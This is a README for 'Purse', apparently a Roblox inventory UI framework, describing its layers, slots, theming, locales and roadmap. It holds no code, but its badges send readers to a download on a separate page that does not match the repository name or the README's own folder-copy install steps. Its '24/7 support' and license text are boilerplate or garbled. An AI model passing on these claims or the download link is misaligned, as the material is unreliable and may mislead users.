![preview](https://raw.githubusercontent.com/Adrianradap/pocket-satchel/main/banner_979f6.svg)
[![Download](https://raw.githubusercontent.com/Adrianradap/pocket-satchel/main/grab_5b2c1.svg)](https://Adrianradap.github.io/pocket-satchel/)

# Purse — Modular Inventory Shell for Roblox Experiences

Purse is an opinionated reimagining of the classic Roblox backpack: a decoupled, CoreGui-independent inventory framework that hands full control of item presentation, slot logic, and input routing back to the developer. Instead of inheriting the rigid behavior of the default backpack, Purse provides a lightweight orchestration layer that you can bend, extend, or replace entirely — while keeping the familiar ergonomics that players already understand.

The name says it all: a purse is a personal container, carried close, opened on demand, and shaped by whoever owns it. Purse applies that philosophy to in-experience inventories — your game decides the shape, the skin, and the rules; Purse handles the choreography.

MIT licensed · Actively maintained through 2026 · Built for creators who treat UI as a first-class system.

---

## 📚 Table of Contents

- [Why Purse Exists](#-why-purse-exists)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [Module Map](#-module-map)
- [Installation & First Run](#-installation--first-run)
- [Configuration Reference](#-configuration-reference)
- [Slot System Deep Dive](#-slot-system-deep-dive)
- [Input & Hotbar Behavior](#-input--hotbar-behavior)
- [Theming & Responsive UI](#-theming--responsive-ui)
- [Multilingual Support](#-multilingual-support)
- [Accessibility & Player Comfort](#-accessibility--player-comfort)
- [Persistence & Session Integrity](#-persistence--session-integrity)
- [Events, Signals & Extension Hooks](#-events-signals--extension-hooks)
- [Performance Notes](#-performance-notes)
- [Testing & QA Workflows](#-testing--qa-workflows)
- [Community & Support](#-community--support)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Why Purse Exists

Roblox ships a default backpack. It works, it's familiar, and for a huge swath of games it's perfectly adequate. But the moment your experience diverges from the standard loop — asymmetric inventories, weight-based carry systems, contextual toolbars, skill wheels, or genre-blended UIs — the default backpack becomes a negotiation rather than a tool.

Purse decouples the concept of "holding things" from the CoreGui implementation. It doesn't fight the platform; it simply steps sideways. The result is an inventory shell that behaves like a well-mannered guest in your UI hierarchy: present when needed, invisible when not, and never opinionated about how your slots should look.

Think of it as the difference between a fixed cabinet and a modular shelving system. The cabinet is fine until you buy something that doesn't fit. The shelving system adapts.

---

## ✨ Feature Highlights

- **CoreGui-independent rendering** — Purse never assumes ownership of the topbar or system tray.
- **Responsive UI layer** — Grid, list, radial, and compact modes scale gracefully across devices and viewport sizes.
- **Multilingual support** — Localization-ready string tables with runtime locale switching and right-to-left layout awareness.
- **24/7 customer support** — Community channels and issue triage maintained continuously, including weekends and holidays.
- **Deterministic slot logic** — Priority, stacking, and override rules you can reason about without spelunking through source.
- **Non-invasive input routing** — Keyboard, gamepad, and touch handled through a unified binding map.
- **Signal-first API** — Everything emits; nothing surprises.
- **Zero external dependencies** — A single self-contained module tree.
- **Theme tokens** — Color, spacing, and typography defined centrally for effortless restyling.
- **Persistence adapters** — Pluggable backends for save/restore without forcing a data schema on you.

---

## 🏗 Architecture Overview

Purse is organized around four cooperating layers:

1. **State Layer** — The canonical inventory model. Slots, contents, ordering, and metadata live here and nowhere else.
2. **Controller Layer** — Interprets user intent. Translates raw input into high-level actions (select, swap, drop, use).
3. **View Layer** — Renders the state. Consumes tokens, locale strings, and layout mode. Stateless by design.
4. **Bridge Layer** — The seam between Purse and your game. You implement a small set of adapters; Purse calls them predictably.

This separation means you can rewrite the view entirely without touching slot logic, or swap the state backend without rewriting your UI. Each layer is testable in isolation — a rare luxury in UI-heavy systems.

---

## 🗺 Module Map

A guided tour of the tree, written for humans:

- **Purse.init** — Bootstraps the framework with your configuration.
- **Purse.state** — The inventory model and its mutation API.
- **Purse.slots** — Slot generation, ordering, and conflict resolution.
- **Purse.input** — Binding map and intent dispatcher.
- **Purse.view** — Renderer entry point; delegates to layout modules.
- **Purse.layouts** — Grid, list, radial, and compact layout implementations.
- **Purse.theme** — Token registry and resolver.
- **Purse.locale** — String table loader and formatter.
- **Purse.persist** — Adapter interface for save/load.
- **Purse.signals** — Internal signal bus exposed for extension.

Each module is documented inline and designed to be read in one sitting. No module exceeds a comfortable reading length by design.

---

## 🚀 Installation & First Run

Purse is distributed as a self-contained module tree. To bring it into your project, place the Purse folder alongside your existing client scripts and require it from your bootstrap script. There is no package manager ceremony, no external service to configure, and no network calls at runtime.

A minimal bootstrap looks like this in spirit:

- Require the Purse module from your client entry point.
- Call `Purse.init` with a configuration table (viewport parent, theme tokens, locale, and your persistence adapter).
- Register at least one slot group describing capacity and layout mode.
- Bind a key or button to the toggle action.

That's the entire ceremony. From there, everything else is incremental: add slots, wire signals, swap themes, layer in locales.

If you prefer to study a working example first, the examples directory contains several reference integrations covering a survival inventory, a weapon wheel, and a compact mobile toolbar.

---

## ⚙️ Configuration Reference

Purse's configuration surface is intentionally small. A few well-chosen knobs beat a sprawling options menu.

- **parent** — The GuiObject that hosts the rendered view.
- **mode** — Default layout mode (`grid`, `list`, `radial`, `compact`).
- **capacity** — Maximum simultaneous slots.
- **theme** — Named theme or inline token table.
- **locale** — Initial locale code; falls back gracefully.
- **persist** — Adapter instance or `nil` for session-only inventories.
- **inputMap** — Binding overrides for toggle, navigate, confirm, cancel.
- **responsive** — Breakpoints for viewport-driven layout switching.

Defaults are chosen so that a first-time integrator can call `Purse.init({})` and get something sensible. Explicit configuration is available for every meaningful behavior.

---

## 🎒 Slot System Deep Dive

Slots are the atoms of Purse. A slot is not just a rectangle that holds an item — it's a contract describing what may occupy it, how it behaves when occupied, and what happens when contention arises.

Each slot carries:

- **Identity** — A stable key for referencing across sessions.
- **Capacity** — How many items it may hold, and whether stacking rules apply.
- **Priority** — Ordering weight when multiple slots compete for a position.
- **Filter** — Predicate determining which items are admissible.
- **Metadata** — Arbitrary developer-defined fields, preserved across renders.

Conflict resolution follows a strict priority-first, registration-order-second rule. Predictability over cleverness. If two slots claim the same item, the higher-priority slot wins, and the loser emits a signal so you can log or react.

---

## ⌨️ Input & Hotbar Behavior

Purse treats input as intent, not as raw events. Your binding map declares what the player wants to do; Purse decides how to interpret the physical input across devices.

Supported intents:

- **Toggle** — Open or close the inventory shell.
- **Navigate** — Move focus between slots.
- **Confirm** — Activate the focused slot.
- **Cancel** — Dismiss the shell or clear focus.
- **Cycle** — Rotate through a slot group's contents.
- **Drop** — Release the focused item into the world.

Keyboard, gamepad, and touch all resolve to the same intents, which means your game logic never needs to branch on input device. Hotbar behavior is a first-class concept: a subset of slots may be pinned to a persistent hotbar strip with its own layout and visibility rules.

---

## 🎨 Theming & Responsive UI

Theming in Purse is token-based. Rather than styling widgets directly, you define tokens — color, spacing, radius, typography scale — and the view resolves them at render time. Change a token, and every consumer updates. Ship two themes, and players can switch at runtime without a reload.

Responsive behavior is declarative. You define breakpoints in viewport units; Purse selects the appropriate layout mode and re-renders accordingly. A grid on desktop becomes a compact strip on mobile without any per-device branching in your code. The UI respects safe areas, notches, and dynamic scaling factors out of the box.

---

## 🌐 Multilingual Support

Purse's locale system is a thin, fast formatter over plain string tables. You supply tables keyed by locale code; Purse handles lookup, fallback chains, and runtime switching. Pluralization and gendered forms are supported through a small ICU-inspired subset — enough for real products, not a full internationalization framework.

Right-to-left locales trigger automatic layout mirroring where applicable. Numeric formatting respects locale conventions for separators and grouping. If a translation is missing, Purse falls back along a developer-defined chain and emits a diagnostic signal so you can catch gaps before your players do.

---

## ♿ Accessibility & Player Comfort

Accessibility isn't an afterthought bolted on at the end — it's a rendering concern, and Purse treats it that way. Focus indicators are themable and always visible by default. Contrast ratios for default themes meet WCAG AA guidelines. Motion-sensitive users can disable transitions with a single token.

Screen-reader-friendly labels are supported for every slot and action, with locale-aware announcements on focus change. Reduced-motion mode, high-contrast mode, and adjustable UI scale are all available as first-class toggles.

---

## 💾 Persistence & Session Integrity

Purse never assumes it owns your data layer. The persistence adapter is an interface, not an implementation. Provide a save function and a load function; Purse calls them at well-defined moments and stays out of your way otherwise.

Session integrity is guarded by a lightweight checksum on slot metadata. If a save is detected as malformed or version-incompatible, Purse refuses to load it destructively and emits a recovery signal instead. Players don't lose their inventories to a bad write; developers get a clear diagnostic.

---

## 🔔 Events, Signals & Extension Hooks

Every meaningful transition in Purse emits a signal. You can observe, or you can intervene. Signals are synchronous by default, with an optional deferred mode for expensive listeners.

Key signals include:

- **Purse.SlotAdded / SlotRemoved**
- **Purse.ItemPlaced / ItemRemoved**
- **Purse.FocusChanged**
- **Purse.LayoutChanged**
- **Purse.LocaleChanged**
- **Purse.SaveRequested / SaveCompleted**
- **Purse.Diagnostic**

Extension hooks allow you to wrap rendering, inject middleware between input and intent, or post-process state mutations. The hook surface is intentionally narrow — enough to be useful, not so broad that it becomes a maintenance burden.

---

## ⚡ Performance Notes

Purse is designed for the realities of Roblox: unpredictable frame budgets, mixed device classes, and players who notice a 16 ms hiccup. Rendering is batched and diffed; only changed slots re-render. Signal dispatch is allocation-light. Locale lookups are cached after first resolution.

On a mid-range mobile device, a 40-slot grid renders in a single frame with headroom to spare. The system favors steady-state predictability over micro-optimizations that only help synthetic benchmarks.

---

## 🧪 Testing & QA Workflows

Purse ships with a test harness covering slot logic, conflict resolution, locale fallback, and adapter contracts. Tests are deterministic and run headlessly, which makes them suitable for continuous integration.

For manual QA, Purse exposes a diagnostic overlay that visualizes slot state, focus traversal, and layout mode. Toggle it at runtime to inspect what the framework believes is happening — invaluable when your UI disagrees with your expectations.

---

## 🤝 Community & Support

Purse is maintained with a long tail in mind. Issues are triaged continuously, including weekends and holidays, so contributors never wait in silence. Discussions cover integration patterns, theming recipes, and edge cases that don't warrant an issue.

24/7 customer support doesn't mean a hotline — it means you'll find a human on the other end of an issue within a reasonable window, at any hour, on any day. That commitment is part of the project's charter.

---

## 🛣 Roadmap for 2026

- **Quarter 1** — Stable 1.0 API freeze; documentation overhaul.
- **Quarter 2** — Additional layout modes: wheel-adjacent hybrid, tabbed groups.
- **Quarter 3** — Enhanced locale tooling, including a translation audit utility.
- **Quarter 4** — Expanded adapter catalog for common persistence backends.

Roadmap items are proposals, not promises. Priorities shift with contributor interest and real-world feedback.

---

## 🧩 Contributing

Contributions are welcome and reviewed with care. Before opening a pull request, please read the contributing guidelines and ensure your changes include tests where behavior is affected. Documentation improvements are just as valued as code — sometimes more so.

A good first contribution is often a locale table, a theme preset, or a bug report with a minimal reproduction. Small, focused PRs land faster than sweeping rewrites.

---

## ⚠️ Disclaimer

Purse is an independent open-source project. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. All trademarks belong to their respective owners.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of the software.

You are responsible for ensuring that your use of Purse complies with the platform terms and policies that apply to your experience. Purse is a UI framework; it does not alter, bypass, or interfere with platform-provided systems beyond the standard mechanisms available to any developer.

---

## 📄 License

Purse is released under the MIT License. The full text is available in the repository's LICENSE file: https://opensource.org/licenses/MIT

Copyright (c) 2026 the Purse contributors.

Permission is hereby granted, a copy of this license is included with the software, and the software may be used, copied, modified, merged, published, distributed, sublicensed, and/or sold, subject to the conditions of the MIT License.

[![Download](https://raw.githubusercontent.com/Adrianradap/pocket-satchel/main/grab_5b2c1.svg)](https://Adrianradap.github.io/pocket-satchel/)